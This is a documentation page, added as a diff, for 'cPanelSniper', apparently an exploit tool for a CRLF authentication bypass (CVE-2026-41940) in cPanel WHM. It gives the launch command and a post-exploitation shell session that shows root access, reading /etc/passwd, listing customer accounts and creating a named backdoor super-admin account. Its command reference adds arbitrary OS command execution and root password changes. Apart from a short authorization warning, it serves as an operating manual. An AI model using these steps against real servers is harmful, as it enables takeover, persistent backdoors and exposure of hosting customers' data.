@@ -1,0 +1,135 @@
+---
+title: "Interactive WHM Shell After CVE-2026-41940 Bypass"
+description: "Use cPanelSniper's interactive WHM shell for hands-on post-exploitation: run OS commands, read files, manage accounts, and call raw WHM API endpoints."
+---
+
+After a confirmed CVE-2026-41940 bypass, cPanelSniper can drop you into a persistent, interactive shell session against the target's WHM interface. The shell wraps the authenticated WHM JSON API behind a familiar command-line experience, letting you explore the server, read files, manage accounts, and issue raw API calls without leaving the tool.
+
+<Warning>
+  The interactive shell makes authenticated requests to a live WHM instance. Only use it against systems you are explicitly authorized to test.
+</Warning>
+
+## Launching the shell
+
+Pass `--action shell` with a single target via `-u`. The exploit chain runs first; if the bypass succeeds, the shell prompt appears immediately.
+
+```bash
+python3 cPanelSniper.py -u https://target.com:2087 --action shell
+```
+
+<Note>
+  The shell only launches when a single target is given via `-u`. It is not available during bulk scans with `-l` or stdin input.
+</Note>
+
+## Shell prompt
+
+The prompt shows your effective identity and the target hostname:
+
+```text
+mitsec@target.com ▶
+```
+
+`mitsec` is the tool's fixed display name. The hostname comes from the canonical hostname discovered during Stage 0 of the exploit chain.
+
+The shell header printed on entry confirms the target and auth method:
+
+```text
+════════════════════════════════════════════════════════════
+  WHM Shell — target.com
+  Version: CVE-2026-41940 | Auth: CRLF bypass
+  Type 'help' for commands, 'exit' to quit
+════════════════════════════════════════════════════════════
+```
+
+## Example session
+
+The following session demonstrates a realistic post-exploitation workflow:
+
+```text
+════════════════════════════════════════════════════════════
+  WHM Shell — target.com
+  Version: CVE-2026-41940 | Auth: CRLF bypass
+  Type 'help' for commands, 'exit' to quit
+════════════════════════════════════════════════════════════
+
+mitsec@target.com ▶ id
+  uid=0(root) gid=0(root) groups=0(root)
+
+mitsec@target.com ▶ accounts
+  [cPanel Accounts]  target.com:2087 (47 users)
+    user01               domain: example.com    email: admin@example.com
+    user02               domain: shop.com       email: info@shop.com
+    ...
+
+mitsec@target.com ▶ cat /etc/passwd
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  ...
+
+mitsec@target.com ▶ info
+  [Server Info]  https://target.com:2087
+  hostname: srv01.target.com
+  load: 0.72 / 0.66 / 0.69
+  version: 11.130.0.6
+
+mitsec@target.com ▶ addadmin mitsec P@ss2026!
+  [BACKDOOR ADMIN CREATED]
+  Target   : https://target.com:2087
+  Username : mitsec
+  Password : P@ss2026!
+  Profile  : super_admin
+
+mitsec@target.com ▶ exit
+```
+
+## Command reference
+
+| Command | Description |
+|---------|-------------|
+| `id` / `whoami` | Show effective UID (always `root`) and server hostname |
+| `hostname` | Get the canonical server hostname |
+| `version` | Print cPanel version information |
+| `info` | Load averages, disk info, MySQL host, and cPanel version |
+| `accounts` | List all cPanel user accounts with domain and email |
+| `cat <path>` | Read the contents of a file via the WHM Fileman API |
+| `ls [path]` | List a directory (defaults to `/` if no path given) |
+| `exec <cmd>` | Execute an OS command via the WHM exec API |
+| `addadmin <user> <pass>` | Create a backdoor WHM reseller/admin account |
+| `passwd <pass>` | Change the root system password |
+| `api <endpoint> [k=v ...]` | Issue a raw authenticated WHM JSON API call |
+| `help` | Print all available commands |
+| `exit` | Exit the interactive shell |
+
+## The `api` command
+
+`api` lets you call any WHM JSON API endpoint directly without leaving the shell. Pass the endpoint name followed by optional `key=value` parameters separated by spaces.
+
+```text
+mitsec@target.com ▶ api listaccts search=user
+  HTTP 200
+  { "data": { "acct": [ ... ] } }
+
+mitsec@target.com ▶ api gethostname
+  HTTP 200
+  { "data": "srv01.target.com" }
+
+mitsec@target.com ▶ api loadavg
+  HTTP 200
+  { "data": { "one": "0.72", "five": "0.66", "fifteen": "0.69" } }
+```
+
+The raw JSON response is printed with a 1000-character limit. Use this command to call any endpoint in the [WHM JSON API](https://api.docs.cpanel.net/openapi/whm/operation/) that is accessible under the authenticated root session.
+
+<Tip>
+  Unrecognized commands are automatically forwarded to the `exec` handler, so you can type a shell command directly (e.g., `uname -a`) without the `exec` prefix.
+</Tip>
+
+## Interrupting the shell
+
+Press **Ctrl+C** at any time to cancel the current operation. The shell remains open and prints a reminder:
+
+```text
+  Ctrl+C — type 'exit' to quit
+```
+
+Type `exit` or `quit` (or press **Ctrl+D**) to leave the shell cleanly.
